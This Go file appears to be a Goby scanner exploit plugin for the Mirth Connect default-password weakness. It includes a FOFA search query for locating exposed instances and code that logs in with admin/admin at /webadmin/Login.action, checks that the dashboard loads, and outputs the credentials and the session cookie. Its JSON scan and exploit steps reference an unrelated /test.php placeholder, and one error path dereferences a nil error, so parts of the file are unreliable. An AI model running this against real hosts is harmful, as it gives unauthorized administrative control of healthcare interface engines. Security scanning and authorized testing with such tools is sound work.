package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Mirth Connect Default Password Vulnerability",
    "Description": "<p>Mirth Connect is an interface engine system.</p><p>There is a default password for this application. An attacker can control the entire platform through the default password (admin/admin) and operate the core functions with administrator privileges.</p>",
    "Product": "Mirth Connect",
    "Homepage": "https://www.nextgentechinc.com/",
    "DisclosureDate": "2022-03-31",
    "Author": "13eczou",
    "FofaQuery": "title=\"Mirth Connect Administrator\"",
    "GobyQuery": "title=\"Mirth Connect Administrator\"",
    "Level": "1",
    "Impact": "<p>Attackers can control the entire platform through the default password(admin/admin) vulnerability, and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "Mirth Connect 接口引擎系统默认口令漏洞",
            "Product": "nextgen-Mirth-Connect-Admin",
            "Description": "<p>Mirth Connect是一款接口引擎系统。</p><p>该应用存在默认口令，攻击者可通过默认口令（admin/admin）控制整个平台，使用管理员权限操作核心功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令（admin/admin）漏洞控制整个平台，使用管理员权限操作核心的功能。<br><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Mirth Connect Default Password Vulnerability",
            "Product": "Mirth Connect",
            "Description": "<p>Mirth Connect is an interface engine system.<br></p><p>There is a default password for this application. An attacker can control the entire platform through the default password (admin/admin) and operate the core functions with administrator privileges.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through the default password(admin/admin) vulnerability, and use administrator privileges to operate core functions.</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10834"
}`
	getCookiesGRYFF3djt := func(hostInfo *httpclient.FixUrl, uri, cookie string) (*httpclient.HttpResponse, error) {
		requestConfig := httpclient.NewGetRequestConfig(uri)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Cookie", cookie)
		return httpclient.DoHttpRequest(hostInfo, requestConfig)
	}
	doLoginGRYFF3djt := func(hostInfo *httpclient.FixUrl, data, cookie string) (*httpclient.HttpResponse, error) {
		requestConfig := httpclient.NewPostRequestConfig("/webadmin/Login.action")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		requestConfig.Header.Store("Cookie", cookie)
		requestConfig.Data = data
		return httpclient.DoHttpRequest(hostInfo, requestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := getCookiesGRYFF3djt(hostInfo, "/webadmin/Index.action", "")
			if err != nil || !(resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `Mirth`)) {
				return false
			}
			resp2, err2 := doLoginGRYFF3djt(hostInfo, "op=login&version=0.0.0&username=admin&password=admin", resp.Cookie)
			resp3, err3 := getCookiesGRYFF3djt(hostInfo, "/webadmin/DashboardStatistics.action", resp.Cookie)
			if err2 != nil || err3 != nil {
				return false
			}
			if resp2.StatusCode == 302 && strings.Contains(resp2.HeaderString.String(), "DashboardStatistics.action") && strings.Contains(resp3.Utf8Html, "Current Statistics") && strings.Contains(resp3.Utf8Html, "Lifetime Statistics") {
				stepLogs.VulURL = fmt.Sprintf("%s://admin:admin@%s", hostInfo.Scheme(), hostInfo.HostInfo)
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			resp, err := getCookiesGRYFF3djt(expResult.HostInfo, "/webadmin/Index.action", "")
			if err != nil || !(resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `Mirth`)) {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			resp2, err2 := doLoginGRYFF3djt(expResult.HostInfo, "op=login&version=0.0.0&username=admin&password=admin", resp.Cookie)
			resp3, err3 := getCookiesGRYFF3djt(expResult.HostInfo, "/webadmin/DashboardStatistics.action", resp.Cookie)
			if err2 != nil || err3 != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if resp2.StatusCode == 302 && strings.Contains(resp2.HeaderString.String(), "DashboardStatistics.action") && strings.Contains(resp3.Utf8Html, "Current Statistics") && strings.Contains(resp3.Utf8Html, "Lifetime Statistics") {
				expResult.Success = true
				expResult.Output = "账号：admin\n密码：admin\nCookie："+resp.Cookie
				return expResult
			}
			return expResult
		},
	))
}
